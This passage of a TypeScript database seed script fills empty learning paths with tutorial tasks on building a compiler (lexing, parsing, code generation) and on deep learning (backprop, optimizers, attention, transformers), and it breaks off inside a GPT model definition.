import Database from 'better-sqlite3';

const db = new Database('data/quest-log.db');

const insertModule = db.prepare(
	'INSERT INTO modules (path_id, name, description, order_index, created_at) VALUES (?, ?, ?, ?, ?)'
);
const insertTask = db.prepare(
	'INSERT INTO tasks (module_id, title, description, details, order_index, created_at) VALUES (?, ?, ?, ?, ?, ?)'
);

const now = Date.now();

function addTasks(pathId: number, modules: { name: string; desc: string; tasks: [string, string, string][] }[]) {
	modules.forEach((mod, i) => {
		const m = insertModule.run(pathId, mod.name, mod.desc, i, now);
		mod.tasks.forEach(([title, desc, details], j) => {
			insertTask.run(m.lastInsertRowid, title, desc, details, j, now);
		});
	});
}

// Find all paths with 0 tasks
const emptyPaths = db.prepare(`
	SELECT p.id, p.name FROM paths p
	LEFT JOIN modules m ON m.path_id = p.id
	LEFT JOIN tasks t ON t.module_id = m.id
	GROUP BY p.id
	HAVING COUNT(t.id) = 0
`).all() as { id: number; name: string }[];

console.log(`Found ${emptyPaths.length} paths with no tasks`);

for (const path of emptyPaths) {
	console.log(`Adding tasks to: ${path.name}`);

	// Add generic but relevant tasks based on path name
	if (path.name.includes('Compiler') || path.name.includes('Programming Language')) {
		addTasks(path.id, [
			{ name: 'Lexical Analysis', desc: 'Build the lexer', tasks: [
				['Design token types', 'Define tokens: keywords (if, while, fn), operators (+, -, ==), literals (123, "string"), identifiers, punctuation.',
`## Token Type Design

### Token Categories
\`\`\`rust
enum TokenType {
    // Literals
    Integer(i64),
    Float(f64),
    String(String),
    Bool(bool),

    // Identifiers & Keywords
    Identifier(String),
    If, Else, While, For, Fn, Let, Return,

    // Operators
    Plus, Minus, Star, Slash,
    Eq, NotEq, Lt, Gt, LtEq, GtEq,
    And, Or, Not,
    Assign,

    // Punctuation
    LParen, RParen, LBrace, RBrace,
    Comma, Semicolon, Colon,

    // Special
    EOF, Newline,
}
\`\`\`

### Token Structure
\`\`\`rust
struct Token {
    token_type: TokenType,
    lexeme: String,      // Original text
    line: usize,
    column: usize,
}
\`\`\`

## Completion Criteria
- [ ] All token types defined
- [ ] Tokens carry source location
- [ ] Keywords distinguished from identifiers`],

				['Implement lexer', 'Read source character by character. Match patterns: digits→number, letters→identifier/keyword, quotes→string.',
`## Lexer Implementation

### Core Loop
\`\`\`rust
fn scan_token(&mut self) -> Token {
    self.skip_whitespace();

    let c = self.advance();
    match c {
        '(' => self.make_token(LParen),
        ')' => self.make_token(RParen),
        '+' => self.make_token(Plus),
        '-' => self.make_token(Minus),
        '=' => {
            if self.match_char('=') { self.make_token(Eq) }
            else { self.make_token(Assign) }
        }
        '0'..='9' => self.number(),
        'a'..='z' | 'A'..='Z' | '_' => self.identifier(),
        '"' => self.string(),
        _ => self.error_token("Unexpected character"),
    }
}
\`\`\`

### Helper Methods
\`\`\`rust
fn advance(&mut self) -> char
fn peek(&self) -> char
fn match_char(&mut self, expected: char) -> bool
fn skip_whitespace(&mut self)
\`\`\`

## Completion Criteria
- [ ] Character-by-character scanning
- [ ] Multi-character operators (==, !=)
- [ ] Number literals (int and float)
- [ ] String literals with escapes`],

				['Handle whitespace and comments', 'Skip spaces, tabs, newlines (track line numbers). Handle // line comments and /* block comments */.',
`## Whitespace and Comments

### Whitespace Handling
\`\`\`rust
fn skip_whitespace(&mut self) {
    loop {
        match self.peek() {
            ' ' | '\\t' | '\\r' => { self.advance(); }
            '\\n' => {
                self.line += 1;
                self.column = 0;
                self.advance();
            }
            '/' => {
                if self.peek_next() == '/' {
                    self.line_comment();
                } else if self.peek_next() == '*' {
                    self.block_comment();
                } else {
                    return;
                }
            }
            _ => return,
        }
    }
}
\`\`\`

### Comment Handling
\`\`\`rust
fn line_comment(&mut self) {
    while self.peek() != '\\n' && !self.is_at_end() {
        self.advance();
    }
}

fn block_comment(&mut self) {
    self.advance(); // *
    self.advance(); // /
    let mut depth = 1;
    while depth > 0 && !self.is_at_end() {
        if self.peek() == '/' && self.peek_next() == '*' {
            depth += 1;
        } else if self.peek() == '*' && self.peek_next() == '/' {
            depth -= 1;
        }
        if self.peek() == '\\n' { self.line += 1; }
        self.advance();
    }
}
\`\`\`

## Completion Criteria
- [ ] Line tracking works
- [ ] Line comments skip to EOL
- [ ] Block comments handle nesting`],

				['Add error reporting', 'On invalid character, report line and column. Store source location in tokens for later error messages.',
`## Error Reporting

### Error Token
\`\`\`rust
fn error_token(&self, message: &str) -> Token {
    Token {
        token_type: TokenType::Error,
        lexeme: message.to_string(),
        line: self.line,
        column: self.column,
    }
}
\`\`\`

### Error Display
\`\`\`rust
fn report_error(token: &Token, source: &str) {
    let line_text = source.lines().nth(token.line - 1).unwrap_or("");
    eprintln!("Error at line {}, column {}: {}",
        token.line, token.column, token.lexeme);
    eprintln!("  {}", line_text);
    eprintln!("  {}^", " ".repeat(token.column - 1));
}

// Output:
// Error at line 5, column 12: unexpected character '@'
//   let x = 10 @ 5;
//              ^
\`\`\`

### Common Errors
- Unexpected character
- Unterminated string
- Invalid number format
- Unclosed block comment

## Completion Criteria
- [ ] Errors include line/column
- [ ] Visual pointer to error location
- [ ] Descriptive error messages`],

				['Write lexer tests', 'Test each token type, edge cases: empty input, unclosed strings, nested comments.',
`## Lexer Testing

### Test Structure
\`\`\`rust
#[test]
fn test_single_tokens() {
    assert_tokens("+ - * /", vec![Plus, Minus, Star, Slash, EOF]);
}

#[test]
fn test_numbers() {
    assert_tokens("42", vec![Integer(42), EOF]);
    assert_tokens("3.14", vec![Float(3.14), EOF]);
    assert_tokens("0.5", vec![Float(0.5), EOF]);
}

#[test]
fn test_strings() {
    assert_tokens(r#""hello""#, vec![String("hello".into()), EOF]);
    assert_tokens(r#""line\\n""#, vec![String("line\\n".into()), EOF]);
}

#[test]
fn test_keywords() {
    assert_tokens("if else while", vec![If, Else, While, EOF]);
    assert_tokens("iffy", vec![Identifier("iffy".into()), EOF]);
}
\`\`\`

### Edge Cases
\`\`\`rust
#[test]
fn test_empty_input() {
    assert_tokens("", vec![EOF]);
}

#[test]
fn test_unclosed_string() {
    let tokens = lex(r#""unclosed"#);
    assert!(tokens.iter().any(|t| matches!(t.token_type, Error)));
}

#[test]
fn test_nested_comments() {
    assert_tokens("/* /* nested */ */ x", vec![Identifier("x".into()), EOF]);
}
\`\`\`

## Completion Criteria
- [ ] Test each token type
- [ ] Test multi-char operators
- [ ] Test error cases
- [ ] Test whitespace handling`],
			]},
			{ name: 'Parsing', desc: 'Build the parser', tasks: [
				['Define grammar', 'Write formal grammar in BNF/EBNF. Document operator precedence.',
`## Grammar Definition

### BNF/EBNF Format
\`\`\`ebnf
program     = declaration* EOF ;
declaration = varDecl | funDecl | statement ;
varDecl     = "let" IDENTIFIER ( "=" expression )? ";" ;
funDecl     = "fn" IDENTIFIER "(" parameters? ")" block ;
parameters  = IDENTIFIER ( "," IDENTIFIER )* ;

statement   = exprStmt | ifStmt | whileStmt | block | returnStmt ;
exprStmt    = expression ";" ;
ifStmt      = "if" expression block ( "else" block )? ;
whileStmt   = "while" expression block ;
block       = "{" declaration* "}" ;
returnStmt  = "return" expression? ";" ;

expression  = assignment ;
assignment  = IDENTIFIER "=" assignment | logic_or ;
logic_or    = logic_and ( "or" logic_and )* ;
logic_and   = equality ( "and" equality )* ;
equality    = comparison ( ( "==" | "!=" ) comparison )* ;
comparison  = term ( ( "<" | ">" | "<=" | ">=" ) term )* ;
term        = factor ( ( "+" | "-" ) factor )* ;
factor      = unary ( ( "*" | "/" ) unary )* ;
unary       = ( "!" | "-" ) unary | call ;
call        = primary ( "(" arguments? ")" )* ;
primary     = NUMBER | STRING | "true" | "false" | IDENTIFIER | "(" expression ")" ;
\`\`\`

### Precedence Table (lowest to highest)
| Level | Operators | Associativity |
|-------|-----------|---------------|
| 1 | = | Right |
| 2 | or | Left |
| 3 | and | Left |
| 4 | == != | Left |
| 5 | < > <= >= | Left |
| 6 | + - | Left |
| 7 | * / | Left |
| 8 | ! - (unary) | Right |

## Completion Criteria
- [ ] Full grammar documented
- [ ] Precedence levels clear
- [ ] Associativity defined`],

				['Implement recursive descent parser', 'One function per grammar rule. Consume tokens, return AST nodes.',
`## Recursive Descent Parser

### Parser Structure
\`\`\`rust
struct Parser {
    tokens: Vec<Token>,
    current: usize,
}

impl Parser {
    fn parse(&mut self) -> Vec<Stmt> {
        let mut statements = vec![];
        while !self.is_at_end() {
            statements.push(self.declaration());
        }
        statements
    }

    fn declaration(&mut self) -> Stmt {
        if self.match_token(Let) { self.var_declaration() }
        else if self.match_token(Fn) { self.function() }
        else { self.statement() }
    }

    fn expression(&mut self) -> Expr {
        self.assignment()
    }

    fn term(&mut self) -> Expr {
        let mut expr = self.factor();
        while self.match_tokens(&[Plus, Minus]) {
            let op = self.previous().clone();
            let right = self.factor();
            expr = Expr::Binary(Box::new(expr), op, Box::new(right));
        }
        expr
    }
}
\`\`\`

### Helper Methods
\`\`\`rust
fn advance(&mut self) -> &Token
fn check(&self, token_type: TokenType) -> bool
fn match_token(&mut self, token_type: TokenType) -> bool
fn consume(&mut self, token_type: TokenType, msg: &str) -> Result<&Token>
fn previous(&self) -> &Token
\`\`\`

## Completion Criteria
- [ ] One function per grammar rule
- [ ] Proper token consumption
- [ ] AST construction`],

				['Build AST nodes', 'Design node types: BinaryExpr, IfStmt, FnDecl. Use tagged union or class hierarchy.',
`## AST Node Design

### Expression Nodes
\`\`\`rust
enum Expr {
    Literal(Value),
    Identifier(String),
    Binary {
        left: Box<Expr>,
        operator: Token,
        right: Box<Expr>,
    },
    Unary {
        operator: Token,
        operand: Box<Expr>,
    },
    Call {
        callee: Box<Expr>,
        arguments: Vec<Expr>,
    },
    Assign {
        name: String,
        value: Box<Expr>,
    },
}
\`\`\`

### Statement Nodes
\`\`\`rust
enum Stmt {
    Expression(Expr),
    Let {
        name: String,
        initializer: Option<Expr>,
    },
    Function {
        name: String,
        params: Vec<String>,
        body: Vec<Stmt>,
    },
    If {
        condition: Expr,
        then_branch: Box<Stmt>,
        else_branch: Option<Box<Stmt>>,
    },
    While {
        condition: Expr,
        body: Box<Stmt>,
    },
    Block(Vec<Stmt>),
    Return(Option<Expr>),
}
\`\`\`

## Completion Criteria
- [ ] All expression types covered
- [ ] All statement types covered
- [ ] Proper boxing for recursion`],

				['Handle operator precedence', 'Pratt parser or precedence climbing. Higher precedence binds tighter.',
`## Precedence Handling

### Pratt Parser Approach
\`\`\`rust
fn parse_expression(&mut self, min_precedence: u8) -> Expr {
    let mut left = self.parse_prefix();

    while let Some(op) = self.peek_operator() {
        let prec = op.precedence();
        if prec < min_precedence { break; }

        self.advance();
        let right = self.parse_expression(
            if op.is_right_associative() { prec } else { prec + 1 }
        );
        left = Expr::Binary(Box::new(left), op, Box::new(right));
    }
    left
}

fn precedence(op: &Token) -> u8 {
    match op.token_type {
        Or => 1,
        And => 2,
        Eq | NotEq => 3,
        Lt | Gt | LtEq | GtEq => 4,
        Plus | Minus => 5,
        Star | Slash => 6,
        _ => 0,
    }
}
\`\`\`

### Example Parse
\`\`\`
1 + 2 * 3
→ Binary(1, +, Binary(2, *, 3))

a = b = c  (right-associative)
→ Assign(a, Assign(b, c))
\`\`\`

## Completion Criteria
- [ ] Precedence levels work
- [ ] Left associativity correct
- [ ] Right associativity for assignment`],

				['Add parser error recovery', 'On error, skip to synchronization point. Report error, continue parsing.',
`## Error Recovery

### Synchronization
\`\`\`rust
fn synchronize(&mut self) {
    self.advance();

    while !self.is_at_end() {
        // Sync after statement terminator
        if self.previous().token_type == Semicolon {
            return;
        }

        // Sync at statement keywords
        match self.peek().token_type {
            Fn | Let | If | While | Return => return,
            _ => {}
        }

        self.advance();
    }
}
\`\`\`

### Error Handling
\`\`\`rust
fn declaration(&mut self) -> Option<Stmt> {
    let result = if self.match_token(Let) {
        self.var_declaration()
    } else {
        self.statement()
    };

    match result {
        Ok(stmt) => Some(stmt),
        Err(e) => {
            self.report_error(e);
            self.synchronize();
            None
        }
    }
}
\`\`\`

### Multiple Errors
\`\`\`rust
struct Parser {
    errors: Vec<ParseError>,
    had_error: bool,
}

// Collect errors, report all at end
\`\`\`

## Completion Criteria
- [ ] Recovery at statement boundaries
- [ ] Multiple errors collected
- [ ] Parsing continues after error`],
			]},
			{ name: 'Code Generation', desc: 'Generate output', tasks: [
				['Design IR or output format', 'Choose target: bytecode, LLVM IR, x86, or transpile to JS/C.',
`## Output Format Design

### Option 1: Stack-Based Bytecode
\`\`\`rust
enum OpCode {
    Constant(usize),  // Push constant
    Add, Sub, Mul, Div,
    Negate, Not,
    Equal, Greater, Less,
    Jump(usize),
    JumpIfFalse(usize),
    GetLocal(usize),
    SetLocal(usize),
    Call(usize),      // arg count
    Return,
    Print,
}
\`\`\`

### Option 2: LLVM IR
\`\`\`llvm
define i32 @add(i32 %a, i32 %b) {
  %tmp = add i32 %a, %b
  ret i32 %tmp
}
\`\`\`

### Option 3: Transpile to C
\`\`\`c
int add(int a, int b) {
    return a + b;
}
\`\`\`

### Considerations
- Bytecode: Full control, need VM
- LLVM: Optimizations free, complex API
- C: Easy debugging, portable

## Completion Criteria
- [ ] Format chosen
- [ ] Instruction set designed
- [ ] Encoding scheme defined`],

				['Implement code generator', 'Visitor pattern over AST. Emit instructions for each node type.',
`## Code Generator

### Visitor Pattern
\`\`\`rust
trait CodeGen {
    fn generate(&mut self, node: &Stmt);
    fn generate_expr(&mut self, expr: &Expr);
}

impl CodeGen for Compiler {
    fn generate_expr(&mut self, expr: &Expr) {
        match expr {
            Expr::Literal(val) => {
                let idx = self.add_constant(val);
                self.emit(OpCode::Constant(idx));
            }
            Expr::Binary { left, operator, right } => {
                self.generate_expr(left);
                self.generate_expr(right);
                match operator.token_type {
                    Plus => self.emit(OpCode::Add),
                    Minus => self.emit(OpCode::Sub),
                    Star => self.emit(OpCode::Mul),
                    Slash => self.emit(OpCode::Div),
                    _ => {}
                }
            }
            Expr::Identifier(name) => {
                let slot = self.resolve_local(name);
                self.emit(OpCode::GetLocal(slot));
            }
            // ...
        }
    }
}
\`\`\`

### Stack Tracking
\`\`\`rust
// Track stack depth for locals
fn begin_scope(&mut self)
fn end_scope(&mut self)
fn declare_variable(&mut self, name: &str) -> usize
\`\`\`

## Completion Criteria
- [ ] All expression types handled
- [ ] All statement types handled
- [ ] Local variables tracked`],

				['Handle control flow', 'Generate jumps for if/else and while loops.',
`## Control Flow Generation

### If Statement
\`\`\`rust
fn generate_if(&mut self, stmt: &IfStmt) {
    // Compile condition
    self.generate_expr(&stmt.condition);

    // Jump over then-branch if false
    let jump_to_else = self.emit_jump(OpCode::JumpIfFalse(0));

    // Then branch
    self.generate(&stmt.then_branch);
    let jump_to_end = self.emit_jump(OpCode::Jump(0));

    // Patch jump to else
    self.patch_jump(jump_to_else);

    // Else branch
    if let Some(else_branch) = &stmt.else_branch {
        self.generate(else_branch);
    }

    // Patch jump to end
    self.patch_jump(jump_to_end);
}
\`\`\`

### While Loop
\`\`\`rust
fn generate_while(&mut self, stmt: &WhileStmt) {
    let loop_start = self.current_offset();

    // Condition
    self.generate_expr(&stmt.condition);
    let exit_jump = self.emit_jump(OpCode::JumpIfFalse(0));

    // Body
    self.generate(&stmt.body);
    self.emit_loop(loop_start);

    // Patch exit
    self.patch_jump(exit_jump);
}
\`\`\`

### Jump Patching
\`\`\`rust
fn emit_jump(&mut self, op: OpCode) -> usize {
    self.emit(op);
    self.code.len() - 1  // Return offset to patch
}

fn patch_jump(&mut self, offset: usize) {
    let jump_dist = self.code.len() - offset - 1;
    // Update jump instruction at offset
}
\`\`\`

## Completion Criteria
- [ ] If/else generates correct jumps
- [ ] While loops work
- [ ] Jump patching correct`],

				['Implement functions', 'Generate prologue, epilogue, call/return instructions.',
`## Function Code Generation

### Function Compilation
\`\`\`rust
fn generate_function(&mut self, func: &FunctionDecl) {
    // New compiler for function body
    let mut fn_compiler = Compiler::new();

    // Parameters become first locals
    for param in &func.params {
        fn_compiler.declare_variable(param);
    }

    // Compile body
    for stmt in &func.body {
        fn_compiler.generate(stmt);
    }

    // Implicit return
    fn_compiler.emit(OpCode::Nil);
    fn_compiler.emit(OpCode::Return);

    // Store compiled function
    let function = fn_compiler.finish();
    let idx = self.add_constant(Value::Function(function));
    self.emit(OpCode::Constant(idx));
}
\`\`\`

### Call Generation
\`\`\`rust
fn generate_call(&mut self, call: &CallExpr) {
    // Push function
    self.generate_expr(&call.callee);

    // Push arguments
    for arg in &call.arguments {
        self.generate_expr(arg);
    }

    // Emit call
    self.emit(OpCode::Call(call.arguments.len()));
}
\`\`\`

### Stack Frame (VM side)
\`\`\`
| return addr  |
| saved fp     | <- frame pointer
| local 0      |
| local 1      |
| ...          | <- stack pointer
\`\`\`

## Completion Criteria
- [ ] Functions compile correctly
- [ ] Calls pass arguments
- [ ] Return values work`],

				['Add optimizations', 'Constant folding, dead code elimination, strength reduction.',
`## Compiler Optimizations

### Constant Folding
\`\`\`rust
fn fold_constants(&self, expr: &Expr) -> Option<Value> {
    match expr {
        Expr::Binary { left, op, right } => {
            let l = self.fold_constants(left)?;
            let r = self.fold_constants(right)?;
            match (l, op, r) {
                (Value::Int(a), Plus, Value::Int(b)) => Some(Value::Int(a + b)),
                (Value::Int(a), Minus, Value::Int(b)) => Some(Value::Int(a - b)),
                // ...
                _ => None,
            }
        }
        Expr::Literal(v) => Some(v.clone()),
        _ => None,
    }
}

// 2 + 3 * 4 → 14 at compile time
\`\`\`

### Dead Code Elimination
\`\`\`rust
// After if(false) { ... }
// Skip then-branch entirely

// After return statement
// Skip unreachable code
\`\`\`

### Strength Reduction
\`\`\`rust
// x * 2 → x << 1
// x * 4 → x << 2
// x / 2 → x >> 1 (unsigned)
\`\`\`

### Peephole Optimization
\`\`\`rust
// PUSH x, POP → (nothing)
// PUSH x, PUSH y, POP, POP → (nothing)
\`\`\`

## Completion Criteria
- [ ] Constant folding works
- [ ] Dead code removed
- [ ] At least one strength reduction`],
			]},
		]);
	} else if (path.name.includes('Deep Learning') || path.name.includes('ML') || path.name.includes('Transformer') || path.name.includes('AI')) {
		addTasks(path.id, [
			{ name: 'Foundations', desc: 'Core concepts', tasks: [
				['Understand neural network basics', 'Layers transform inputs via weights+bias+activation. Activations: ReLU, sigmoid, tanh. Backprop uses chain rule.',
`## Neural Network Fundamentals

### Layer Computation
\`\`\`python
# Forward pass
z = x @ W + b        # Linear transformation
a = activation(z)    # Non-linearity

# Common activations
relu(x) = max(0, x)
sigmoid(x) = 1 / (1 + exp(-x))
tanh(x) = (exp(x) - exp(-x)) / (exp(x) + exp(-x))
\`\`\`

### Backpropagation
\`\`\`python
# Chain rule: dL/dW = dL/da * da/dz * dz/dW
# For each layer, compute gradients backward
dL_dz = dL_da * activation_derivative(z)
dL_dW = x.T @ dL_dz
dL_db = dL_dz.sum(axis=0)
dL_dx = dL_dz @ W.T  # Pass to previous layer
\`\`\`

### Why It Works
- Each layer learns features
- Early layers: edges, textures
- Later layers: high-level concepts

## Completion Criteria
- [ ] Can explain forward pass
- [ ] Understand backprop chain rule
- [ ] Know common activations`],

				['Implement gradient descent', 'Compute loss gradient w.r.t. parameters. Update: w = w - lr * gradient.',
`## Gradient Descent Implementation

### Basic SGD
\`\`\`python
def sgd_step(params, grads, lr):
    for p, g in zip(params, grads):
        p -= lr * g
\`\`\`

### SGD with Momentum
\`\`\`python
# Accumulate velocity
velocity = 0.9 * velocity + gradient
param -= lr * velocity

# Helps escape local minima, smoother updates
\`\`\`

### Adam Optimizer
\`\`\`python
# Adaptive learning rates per parameter
m = beta1 * m + (1 - beta1) * grad          # First moment
v = beta2 * v + (1 - beta2) * grad**2       # Second moment
m_hat = m / (1 - beta1**t)                   # Bias correction
v_hat = v / (1 - beta2**t)
param -= lr * m_hat / (sqrt(v_hat) + eps)
\`\`\`

### NumPy Implementation
\`\`\`python
class Adam:
    def __init__(self, lr=0.001, beta1=0.9, beta2=0.999):
        self.lr, self.beta1, self.beta2 = lr, beta1, beta2
        self.m, self.v, self.t = {}, {}, 0

    def step(self, params, grads):
        self.t += 1
        for name, (p, g) in zip(params.keys(), zip(params.values(), grads)):
            if name not in self.m:
                self.m[name] = np.zeros_like(p)
                self.v[name] = np.zeros_like(p)
            # ... compute update
\`\`\`

## Completion Criteria
- [ ] Implemented basic SGD
- [ ] Added momentum
- [ ] Understand Adam`],

				['Build simple neural network', 'Forward: h = relu(x @ W1 + b1), y = h @ W2 + b2. Backward: compute gradients, update weights.',
`## Simple Neural Network from Scratch

### Network Definition
\`\`\`python
import numpy as np

class MLP:
    def __init__(self, input_size, hidden_size, output_size):
        self.W1 = np.random.randn(input_size, hidden_size) * 0.01
        self.b1 = np.zeros(hidden_size)
        self.W2 = np.random.randn(hidden_size, output_size) * 0.01
        self.b2 = np.zeros(output_size)

    def forward(self, x):
        self.x = x
        self.z1 = x @ self.W1 + self.b1
        self.h = np.maximum(0, self.z1)  # ReLU
        self.z2 = self.h @ self.W2 + self.b2
        return self.z2

    def backward(self, dL_dy):
        # Output layer
        dL_dW2 = self.h.T @ dL_dy
        dL_db2 = dL_dy.sum(axis=0)
        dL_dh = dL_dy @ self.W2.T

        # Hidden layer
        dL_dz1 = dL_dh * (self.z1 > 0)  # ReLU derivative
        dL_dW1 = self.x.T @ dL_dz1
        dL_db1 = dL_dz1.sum(axis=0)

        return [(self.W1, dL_dW1), (self.b1, dL_db1),
                (self.W2, dL_dW2), (self.b2, dL_db2)]
\`\`\`

### Training on XOR
\`\`\`python
X = np.array([[0,0], [0,1], [1,0], [1,1]])
y = np.array([[0], [1], [1], [0]])

model = MLP(2, 8, 1)
lr = 0.1
for epoch in range(1000):
    pred = model.forward(X)
    loss = ((pred - y) ** 2).mean()
    dL_dy = 2 * (pred - y) / len(y)
    grads = model.backward(dL_dy)
    for (param, grad) in grads:
        param -= lr * grad
\`\`\`

## Completion Criteria
- [ ] Forward pass works
- [ ] Backward pass computes gradients
- [ ] Trains on XOR successfully`],

				['Learn PyTorch/TensorFlow basics', 'Tensors, autograd, nn.Module. Define model class with forward() method.',
`## PyTorch Fundamentals

### Tensors
\`\`\`python
import torch

# Create tensors
x = torch.tensor([[1, 2], [3, 4]], dtype=torch.float32)
x = torch.randn(3, 4)  # Random normal
x = torch.zeros(2, 3)

# Operations
y = x @ W + b
y = torch.relu(x)
y = x.sum(), x.mean(), x.max()
\`\`\`

### Autograd
\`\`\`python
x = torch.tensor([1.0, 2.0], requires_grad=True)
y = x.sum() ** 2
y.backward()
print(x.grad)  # dy/dx
\`\`\`

### nn.Module
\`\`\`python
import torch.nn as nn

class MLP(nn.Module):
    def __init__(self, input_dim, hidden_dim, output_dim):
        super().__init__()
        self.fc1 = nn.Linear(input_dim, hidden_dim)
        self.fc2 = nn.Linear(hidden_dim, output_dim)

    def forward(self, x):
        x = torch.relu(self.fc1(x))
        x = self.fc2(x)
        return x
\`\`\`

### Training Loop
\`\`\`python
model = MLP(784, 256, 10)
optimizer = torch.optim.Adam(model.parameters(), lr=0.001)
criterion = nn.CrossEntropyLoss()

for epoch in range(10):
    for x, y in dataloader:
        optimizer.zero_grad()
        pred = model(x)
        loss = criterion(pred, y)
        loss.backward()
        optimizer.step()
\`\`\`

## Completion Criteria
- [ ] Create and manipulate tensors
- [ ] Use autograd
- [ ] Define custom nn.Module`],

				['Understand loss functions', 'MSE for regression, cross-entropy for classification. Label smoothing for regularization.',
`## Loss Functions

### Mean Squared Error (Regression)
\`\`\`python
def mse_loss(pred, target):
    return ((pred - target) ** 2).mean()

# Gradient: 2 * (pred - target) / n
# Use when: continuous targets
\`\`\`

### Cross-Entropy (Classification)
\`\`\`python
def cross_entropy(logits, target):
    # target is class index
    probs = softmax(logits)
    return -log(probs[target])

# PyTorch combines softmax + log + NLL
loss = nn.CrossEntropyLoss()(logits, target)
\`\`\`

### Binary Cross-Entropy
\`\`\`python
def bce_loss(pred, target):
    # pred is probability (after sigmoid)
    return -(target * log(pred) + (1-target) * log(1-pred))
\`\`\`

### Label Smoothing
\`\`\`python
# Instead of one-hot [0, 0, 1, 0]
# Use smoothed [0.025, 0.025, 0.925, 0.025]
# Prevents overconfidence

loss = nn.CrossEntropyLoss(label_smoothing=0.1)
\`\`\`

### When to Use What
| Task | Loss |
|------|------|
| Regression | MSE, MAE, Huber |
| Binary classification | BCE |
| Multi-class | Cross-Entropy |
| Multi-label | BCE per class |

## Completion Criteria
- [ ] Implement MSE from scratch
- [ ] Understand cross-entropy
- [ ] Know when to use each`],
			]},
			{ name: 'Architecture', desc: 'Model architectures', tasks: [
				['Implement attention mechanism', 'Attention(Q,K,V) = softmax(QK^T/√d)V. Scaled dot-product attention.',
`## Attention Mechanism

### Scaled Dot-Product Attention
\`\`\`python
def attention(Q, K, V, mask=None):
    d_k = Q.shape[-1]
    scores = Q @ K.transpose(-2, -1) / sqrt(d_k)

    if mask is not None:
        scores = scores.masked_fill(mask == 0, -1e9)

    weights = softmax(scores, dim=-1)
    return weights @ V
\`\`\`

### Intuition
- Q (Query): What am I looking for?
- K (Key): What do I have?
- V (Value): What do I return?
- Score: How relevant is each key to my query?

### Why Scale by √d?
\`\`\`
Without scaling: dot products grow with dimension
Large values → softmax saturates → tiny gradients
Scaling keeps variance ≈ 1
\`\`\`

### Shapes
\`\`\`
Q, K, V: (batch, seq_len, d_model)
Scores: (batch, seq_len, seq_len)
Output: (batch, seq_len, d_model)
\`\`\`

## Completion Criteria
- [ ] Implement attention function
- [ ] Understand Q, K, V roles
- [ ] Know why scaling matters`],

				['Build transformer block', 'MultiHeadAttention → Add&Norm → FFN → Add&Norm. Residual connections.',
`## Transformer Block

### Architecture
\`\`\`python
class TransformerBlock(nn.Module):
    def __init__(self, d_model, n_heads, d_ff):
        super().__init__()
        self.attn = MultiHeadAttention(d_model, n_heads)
        self.norm1 = nn.LayerNorm(d_model)
        self.ffn = nn.Sequential(
            nn.Linear(d_model, d_ff),
            nn.GELU(),
            nn.Linear(d_ff, d_model)
        )
        self.norm2 = nn.LayerNorm(d_model)

    def forward(self, x, mask=None):
        # Pre-LN variant (more stable)
        x = x + self.attn(self.norm1(x), mask)
        x = x + self.ffn(self.norm2(x))
        return x
\`\`\`

### Multi-Head Attention
\`\`\`python
class MultiHeadAttention(nn.Module):
    def __init__(self, d_model, n_heads):
        super().__init__()
        self.n_heads = n_heads
        self.d_k = d_model // n_heads
        self.W_q = nn.Linear(d_model, d_model)
        self.W_k = nn.Linear(d_model, d_model)
        self.W_v = nn.Linear(d_model, d_model)
        self.W_o = nn.Linear(d_model, d_model)

    def forward(self, x, mask=None):
        B, T, C = x.shape
        q = self.W_q(x).view(B, T, self.n_heads, self.d_k).transpose(1, 2)
        k = self.W_k(x).view(B, T, self.n_heads, self.d_k).transpose(1, 2)
        v = self.W_v(x).view(B, T, self.n_heads, self.d_k).transpose(1, 2)
        attn = attention(q, k, v, mask)
        attn = attn.transpose(1, 2).contiguous().view(B, T, C)
        return self.W_o(attn)
\`\`\`

## Completion Criteria
- [ ] Implement multi-head attention
- [ ] Build complete transformer block
- [ ] Understand residual connections`],

				['Add positional encoding', 'Attention is permutation-invariant. Sinusoidal or learned positional embeddings.',
`## Positional Encoding

### Why Needed
\`\`\`
Attention sees input as a SET (no order)
"The cat sat" = "sat cat The"
Need to inject position information
\`\`\`

### Sinusoidal Encoding
\`\`\`python
def sinusoidal_encoding(seq_len, d_model):
    position = torch.arange(seq_len).unsqueeze(1)
    div_term = torch.exp(torch.arange(0, d_model, 2) * (-log(10000.0) / d_model))

    pe = torch.zeros(seq_len, d_model)
    pe[:, 0::2] = torch.sin(position * div_term)
    pe[:, 1::2] = torch.cos(position * div_term)
    return pe

# Usage: x = x + pe[:seq_len]
\`\`\`

### Learned Embeddings
\`\`\`python
class LearnedPositionalEncoding(nn.Module):
    def __init__(self, max_len, d_model):
        super().__init__()
        self.pe = nn.Embedding(max_len, d_model)

    def forward(self, x):
        positions = torch.arange(x.size(1), device=x.device)
        return x + self.pe(positions)
\`\`\`

### RoPE (Modern)
\`\`\`
Rotary Position Embedding
Encodes position in rotation of Q, K vectors
Better extrapolation to longer sequences
\`\`\`

## Completion Criteria
- [ ] Implement sinusoidal encoding
- [ ] Understand frequency intuition
- [ ] Know alternatives (learned, RoPE)`],

				['Implement layer normalization', 'Normalize across features: (x-μ)/σ * γ + β. Stabilizes training.',
`## Layer Normalization

### Formula
\`\`\`python
def layer_norm(x, gamma, beta, eps=1e-5):
    mean = x.mean(dim=-1, keepdim=True)
    var = x.var(dim=-1, keepdim=True)
    x_norm = (x - mean) / torch.sqrt(var + eps)
    return gamma * x_norm + beta
\`\`\`

### vs Batch Normalization
\`\`\`
BatchNorm: normalize across batch dimension
LayerNorm: normalize across feature dimension

LayerNorm benefits:
- Works with any batch size (even 1)
- Better for sequential data
- Independent of other samples
\`\`\`

### Pre-LN vs Post-LN
\`\`\`python
# Post-LN (original transformer)
x = LayerNorm(x + Sublayer(x))

# Pre-LN (more stable)
x = x + Sublayer(LayerNorm(x))
\`\`\`

### RMSNorm (Modern)
\`\`\`python
def rms_norm(x, gamma, eps=1e-6):
    rms = torch.sqrt(x.pow(2).mean(dim=-1, keepdim=True) + eps)
    return gamma * x / rms

# Simpler, no mean subtraction
# Used in LLaMA, etc.
\`\`\`

## Completion Criteria
- [ ] Implement LayerNorm
- [ ] Understand vs BatchNorm
- [ ] Know Pre-LN vs Post-LN`],

				['Build full model', 'Stack N transformer blocks. Add embedding layer and output head.',
`## Full Transformer Model

### GPT-style (Decoder-only)
\`\`\`python
class GPT(nn.Module):
    def __init__(self, vocab_size, d_model, n_heads, n_layers, max_len):
        super().__init__()
        self.token_emb = nn.Embedding(vocab_size, d_model)
        self.pos_emb = nn.Embedding(max_len, d_model)
        self.blocks = nn.ModuleList([
            TransformerBlock(d_model, n_heads, d_model * 4)
